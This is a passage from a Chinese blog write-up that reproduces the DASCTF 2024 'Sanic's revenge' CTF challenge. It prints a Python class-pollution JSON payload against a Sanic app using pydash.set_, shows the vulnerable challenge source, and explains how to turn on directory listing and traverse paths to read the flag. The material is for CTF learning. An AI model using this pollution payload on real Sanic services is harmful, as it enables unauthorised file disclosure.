+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>之前知道flag在app路由下</p>
+<p>&#x2F;static&#x2F;app&#x2F;45W698WqtsgQT1_flag</p>
+<p><img src="/imgs/17.png"></p>
+<p>接下来解释上面遗留的问题</p>
+<p>那么为什么要恶意操作被后台日志记录呢？</p>
+<p>这里复现完了我先把大佬的wp链接放出来，因为我水平有限，基本上就是照着大佬wp来进行复现</p>
+<p>有点为了复现而复现的丑陋感，到后面我会慢慢补好基础的┭┮﹏┭┮</p>
+<p><a href="https://www.cnblogs.com/gxngxngxn/p/18290489">https://www.cnblogs.com/gxngxngxn/p/18290489</a></p>
+<p><a href="https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98">https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98</a></p>
+<p><a href="https://blog.csdn.net/2301_79700060/article/details/140632405">https://blog.csdn.net/2301_79700060/article/details/140632405</a></p>
+<p><a href="https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502</a></p>
+<p>那么我们从</p>
+<p>[<strong>gxngxngxn]</strong></p>
+<p>大佬的文章来解释下</p>
+<p>这套题目其实是ciscn2024 改的一道题目，先放链接</p>
+<p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
+<p>国赛 sanic的源码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;admin 路由那块就是编码成八进制可以进入&#x2F;login,而且需要绕过waf大佬文章都讲了</p>
+<p>直接看sanic那块污染链寻找</p>
+<p>我们可以污染__file__然后进行任意文件读取，但是我们不知道flag的位置所以可以开启目录功能，有关的两个函数</p>
+<p><strong>directory_view</strong> <strong>directory_handler</strong></p>
+<p>只要我们将directory污染为根目录，directory_view污染为True，就可以看到根目录的所有文件了</p>
+<p>这个框架可以通过**app.router.name_index[‘xxxxx’]**来获取注册的路由</p>
+<p>获得这个路由之后我们需要调用到DirectoryHandler里</p>
+<p>我们可以用<strong>name_index</strong>方法发现可以从handler入手，一直可以获取到DirectoryHandler中的directory和directory_view</p>
+<p>从而实现污染达到列目录的目的</p>
+<p>然后接下里就是污染directory</p>
+<p>但是directory是一个对象，而它之前的值就是由其中的<strong>parts</strong>属性决定的，但是由于这个属性是一个tuple，不能直接被污染，所以我们需要找到这个属性是如何被赋值的?（这里我们需要知道tuple(元组：元组是 Python 中的一种数据结构，用于存储多个元素。与列表类似，元组也是一个序列，但与列表不同的是，元组是不可变的。这意味着元组一旦创建，其内容不能修改)）</p>
+<p>所以不能直接污染directory </p>
+<p>但在DirectoryHandler类中有Directory属性可以从这入手进入path对象parts的值最后是给了_parts这个属性发现是list</p>
+<p>最终污染成&#x2F;就成功了</p>
+<p>到时候要去复现下国赛ciscn毕竟那天坐了一天牢</p>
+<p>到这还没完还没</p>
+<p>我们继续看DirectoryHandler类中handle方法中的逻辑:</p>
+<p>当我们开启列目录功能后，就会进入</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>._index(    <span class="variable language_">self</span>.directory / current, path, request.app.debug )</span><br></pre></td></tr></table></figure>
+
+<p>解决上面遗留的问题就是从这开始发现这个目录路径是由Parts+current拼接出来的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">self</span>.directory / current,path, request.app .debug</span><br></pre></td></tr></table></figure>
+
+<p>目的就是让current变成.. 实现目录穿越</p>
+<p>看下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(<span class="variable language_">self</span>.base) :].strip(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从给定的路径中去除基本路径（`self.base`），然后返回剩余路径。首先，`path.strip(&quot;/&quot;)` 去除路径两端的斜杠，然后`[len(self.base):]` 取基本路径之后的部分，最后`.strip(&quot;/&quot;)` 再次去除剩余路径两端的斜杠</span><br><span class="line"></span><br><span class="line">#可以看到current的值就是由path和base两个值决定的</span><br></pre></td></tr></table></figure>
+
+<p>self.base是可控的</p>
+<p><strong>那么我们就得构造current的值</strong></p>
+<p>关键就在于下面</p>
+<p>所以实现目录穿越只要让path的值为static&#x2F;一个目录&#x2F; current值为..就好了</p>
+<p>但是这个目录怎么来？</p>
+<p><strong>file_or_directory</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以改变静态文件的默认路径</span><br><span class="line"></span><br><span class="line">我们只需要通过这个改变到其他目录，该目录下存在其他目录不就好了</span><br></pre></td></tr></table></figure>
+
+<p>它可以改变static的默认路径</p>
+<p>这就是上面为什么需要传入恶意的key,目的就是让日志记录，获得一个报错的目录</p>
+<p>继续改变目录位置（上面改的是&#x2F;tmp）然后修改其base的值为自己报错的目录</p>
+<p>就看实现目录穿越了</p>
+<p>ile_or_directory只是改变它识别的路径，并不会改变</p>
+<p>self.directory中parts的值，这个列目录的值依旧是默认的</p>
+]]></content>
+      <categories>
+        <category>pollute</category>
+      </categories>
+      <tags>
+        <tag>复现</tag>
       </tags>
   </entry>
   <entry>
